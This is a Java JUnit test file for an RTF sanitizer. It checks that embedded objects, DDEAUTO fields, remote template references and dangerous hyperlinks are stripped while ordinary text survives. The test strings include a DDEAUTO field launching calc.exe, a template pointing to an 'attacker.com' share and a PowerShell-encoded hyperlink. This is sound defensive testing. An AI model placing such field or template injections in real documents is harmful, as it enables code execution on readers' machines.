package sanitization.rtf;

import org.junit.jupiter.api.Test;
import threat.common.FindingClassification;
import threat.common.SecurityFinding;
import threat.rtf.RTFThreatAnalyzer;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

public class RTFThreatSanitizerTest {

    private final RTFThreatSanitizer sanitizer = new RTFThreatSanitizer();
    private final RTFThreatAnalyzer analyzer = new RTFThreatAnalyzer();

    @Test
    void disarmsEmbeddedObjectInSampleFile() throws Exception {
        Path sample = Path.of("samples/test_embedded_object.rtf");
        String original = Files.readString(sample);
        List<SecurityFinding> findings = analyzer.analyze(original);

        RTFThreatSanitizer.SanitizationResult result = sanitizer.sanitize(original, findings);
        String cleaned = result.getSanitizedRtf();

        assertFalse(result.getActions().isEmpty());
        assertFalse(cleaned.contains("\\object"));
        assertFalse(cleaned.contains("\\objdata"));

        List<SecurityFinding> postFindings = analyzer.analyze(cleaned);
        assertFalse(postFindings.stream().anyMatch(f ->
                f.getClassification() == FindingClassification.THREAT ||
                f.getClassification() == FindingClassification.POLICY_VIOLATION));
    }

    @Test
    void disarmsDDEFieldAndPreservesStaticText() {
        String rtf = "{\\rtf1\\ansi Prior Text {\\field{\\*\\fldinst DDEAUTO c:\\\\windows\\\\system32\\\\calc.exe}{\\fldrslt {Preserved Calculation Result}}} Subsequent Text}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        RTFThreatSanitizer.SanitizationResult result = sanitizer.sanitize(rtf, findings);
        String cleaned = result.getSanitizedRtf();

        assertFalse(cleaned.contains("DDEAUTO"));
        assertFalse(cleaned.contains("calc.exe"));
        assertTrue(cleaned.contains("Prior Text"));
        assertTrue(cleaned.contains("Preserved Calculation Result"));
        assertTrue(cleaned.contains("Subsequent Text"));

        List<SecurityFinding> postFindings = analyzer.analyze(cleaned);
        assertFalse(postFindings.stream().anyMatch(f -> f.getClassification() == FindingClassification.THREAT));
    }

    @Test
    void disarmsExternalTemplateInjection() {
        String rtf = "{\\rtf1\\ansi{\\*\\template \\\\\\\\attacker.com\\\\share\\\\evil.dotm}\\b Valid Content\\b0}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        RTFThreatSanitizer.SanitizationResult result = sanitizer.sanitize(rtf, findings);
        String cleaned = result.getSanitizedRtf();

        assertFalse(cleaned.contains("attacker.com"));
        assertFalse(cleaned.contains("evil.dotm"));
        assertTrue(cleaned.contains("Valid Content"));

        List<SecurityFinding> postFindings = analyzer.analyze(cleaned);
        assertFalse(postFindings.stream().anyMatch(f -> f.getClassification() == FindingClassification.THREAT));
    }

    @Test
    void neutralizesDangerousHyperlinkScheme() {
        String rtf = "{\\rtf1\\ansi{\\field{\\*\\fldinst HYPERLINK \"powershell.exe -enc AAAA\"}{\\fldrslt Safe Display Text}}}";
        List<SecurityFinding> findings = analyzer.analyze(rtf);

        RTFThreatSanitizer.SanitizationResult result = sanitizer.sanitize(rtf, findings);
        String cleaned = result.getSanitizedRtf();

        assertFalse(cleaned.contains("powershell.exe"));
        assertTrue(cleaned.contains("#disarmed"));
        assertTrue(cleaned.contains("Safe Display Text"));

        List<SecurityFinding> postFindings = analyzer.analyze(cleaned);
        assertFalse(postFindings.stream().anyMatch(f -> f.getClassification() == FindingClassification.THREAT));
    }
}
